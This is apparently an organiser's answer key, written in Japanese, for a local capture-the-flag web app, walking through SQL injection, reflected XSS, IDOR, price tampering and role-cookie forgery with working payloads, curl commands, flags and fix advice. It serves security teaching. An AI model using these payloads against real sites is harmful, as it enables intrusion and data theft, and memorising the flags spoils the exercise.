# 運営者向け想定解・検証手順

> [!WARNING]
> この資料にはフラグと攻撃手順が含まれます。**ローカルまたは隔離されたCTF環境だけ**で使用し、インターネット上のサービスや自分の管理下にない環境に対して試さないでください。競技中は参加者に見えない場所へ保管してください。

## 事前準備

1. アプリを起動します。

   ```bash
   docker compose up --build
   ```

2. ブラウザで `http://localhost:8080/challenges` を開き、問題文を確認します。
3. ログインが必要な問題では、次の参加者用アカウントを使用します。

   - メール: `alice@example.test`
   - パスワード: `password123`
   - 初期残高: 1,000円

4. 状態を初期化したい場合は、Docker volume を削除してから起動し直します。

   ```bash
   docker compose down -v
   docker compose up --build
   ```

## 使用するブラウザーツール

### 開発者ツールを開く

Chrome / Edge では `F12` または `Ctrl+Shift+I`（macOS は `Cmd+Option+I`）で開きます。主に次を使用します。

- **Elements（要素）**: フォームの hidden input を確認・編集する。
- **Application（アプリケーション）→ Cookies**: `localhost` の Cookie を確認・編集する。
- **Console（コンソール）**: JavaScript の実行結果や `localStorage` の値を確認する。
- **Network（ネットワーク）**: リクエストの URL・フォーム送信値を確認する。必要であれば「Edit and Resend」相当の機能や、後述の Burp Suite を使用する。

### `curl`（任意）

ブラウザーで URL エンコードを気にせず検索 URL を再現したいときは、`curl -G --data-urlencode` が便利です。

```bash
curl -G --data-urlencode "q=検索語" http://localhost:8080/
```

ログインが必要な操作を `curl` で行うには、Cookie jar を使います。

```bash
# ログインしてセッション Cookie を保存
curl -i -c cookies.txt -X POST http://localhost:8080/login \
  -d 'email=alice@example.test' \
  -d 'password=password123'

# 保存した Cookie でログイン必須ページを開く
curl -b cookies.txt 'http://localhost:8080/orders'
```

### Burp Suite / OWASP ZAP（任意）

HTTP リクエストをブラウザー外で編集して再送したい場合に使えます。ブラウザーのプロキシを `127.0.0.1:8080` のアプリではなく、Burp/ZAP が待ち受けるローカルプロキシへ設定します。Intercept を有効にし、フォーム送信を捕捉してパラメーターを編集後に Forward / Send します。

この教材では開発者ツールだけで解けます。プロキシツールは「クライアントから送られる値は改変できる」ことを確認するための補助として使ってください。

---

## 1. SQL Injection — 倉庫の隠し商品

### 観察

商品検索の入力値で検索結果が変化します。検索欄は GET パラメーター `q` として送信されます。`'` のような SQL で意味を持つ文字を入力したときにエラー表示が出るかを確認すると、検索値が SQL 文に直接つながれていることを推測できます。

### 手順

1. トップページを開きます。
2. 検索欄に以下を入力して検索します。

   ```sql
   ' UNION SELECT id,name,description,price,emoji FROM products WHERE published=0-- 
   ```

3. 非公開商品の説明としてフラグを確認します。

### `curl` での再現

```bash
curl -G --data-urlencode "q=' UNION SELECT id,name,description,price,emoji FROM products WHERE published=0-- " http://localhost:8080/
```

### フラグ

`FLAG{union_selects_more_than_products}`

### 修正方針

プレースホルダー付きの prepared statement を使い、公開条件を全分岐で保証します。

---

## 2. Reflected XSS — 検索結果のスクリプト

### 観察

検索後の見出しには検索語が表示されます。HTML として解釈される文字列を入れると、出力時にエスケープされていないことを確認できます。ページは検索時に `localStorage` へフラグを保存しています。

### 手順

1. トップページを開きます。
2. 検索欄に以下を入力して検索します。

   ```html
   <img src=x onerror="document.body.innerHTML+=localStorage.vulnmart_flag">
   ```

3. 検索結果ページ上に追加表示されたフラグを確認します。

### Console での確認方法

ペイロードを使わず、保存された値を確認するだけなら、開発者ツールの Console で次を実行します。

```js
localStorage.getItem('vulnmart_flag')
```

### フラグ

`FLAG{xss_runs_in_the_users_origin}`

### 修正方針

出力コンテキストに合う HTML エスケープを行い、CSP を追加します。

---

## 3. IDOR — 他人の注文

### 観察

Alice の注文履歴から開く詳細画面の URL は `/order?id=1` の形式です。ID がリソースの識別子だけであり、ログイン中のユーザーがその注文を所有しているかを確認していない場合、他人の注文が読めます。

### 手順

1. Alice でログインします。
2. `/orders` を開き、Alice の注文詳細を開きます。
3. アドレスバーの URL を `/order?id=2` に変更して開きます。
4. Bob の注文詳細に表示される備考からフラグを確認します。

### `curl` での再現

まず前述の Cookie jar を使ってログインし、次を実行します。

```bash
curl -b cookies.txt 'http://localhost:8080/order?id=2'
```

### フラグ

`FLAG{object_ids_are_not_authorization}`

### 修正方針

`WHERE id = ? AND user_id = ?` のように、取得時にログインユーザーの所有権を必ず検証します。

---

## 4. Parameter Tampering — 買えない限定品

### 観察

限定商品は 50,000 円ですが、Alice の残高は 1,000 円です。カート画面のフォームには `product_id` と `price` が hidden input として含まれます。クライアントが送信する `price` をサーバーが信頼していれば、値の改変で購入できます。

### 手順（開発者ツール）

1. Alice でログインします。
2. トップページで **Limited Flag Box** をカートへ追加します。
3. `/cart` で開発者ツールの Elements を開きます。
4. 次の hidden input を探します。

   ```html
   <input type="hidden" name="price" value="50000">
   ```

5. `value` を `0` に変更します。
6. そのまま「支払う」ボタンを押し、購入完了画面のフラグを確認します。

### 手順（HTTP リクエスト編集）

Network または Burp/ZAP で `/checkout` への POST を捕捉し、本文の `price=50000` を `price=0` に変更して送信します。`product_id=4` はそのままにします。

```text
product_id=4&price=0&address=Tokyo+CTF+Street+1
```

### フラグ

`FLAG{never_trust_client_side_prices}`

### 修正方針

商品 ID からサーバー側で最新価格を取得します。残高確認・減算・注文作成はトランザクション内で行い、価格をクライアント入力から受け取りません。

---

## 5. Broken Access Control — 管理者になりすます

### 観察

ログイン後、ブラウザーには `role=customer` Cookie が設定されます。管理画面が Cookie の値だけで権限を判定している場合、署名もサーバー側照合もない Cookie は利用者が変更できます。

### 手順（開発者ツール）

1. Alice でログインします。
2. 開発者ツールの **Application → Cookies → http://localhost:8080** を開きます。
3. `role` Cookie の Value を `customer` から `admin` に変更します。
4. `http://localhost:8080/admin` を開き、管理画面のフラグを確認します。

### Console での変更方法

Application パネルを使わない場合は、Console で次を実行してから `/admin` を再読み込みします。

```js
document.cookie = 'role=admin; path=/'
```

### フラグ

`FLAG{unsigned_role_cookies_are_not_auth}`

### 修正方針

権限情報はサーバー側のセッションまたは DB から取得し、全管理者ルートで認可します。Cookie に権限情報を持たせる場合でも、改ざん検知だけでなくサーバー側での認可設計が必要です。

---

## 検証後の確認

すべての問題を解いた後、環境を初期状態に戻す場合は次を実行します。

```bash
docker compose down -v
docker compose up --build
```

脆弱なペイロードや変更済み Cookie を、演習環境以外へ持ち出さないでください。
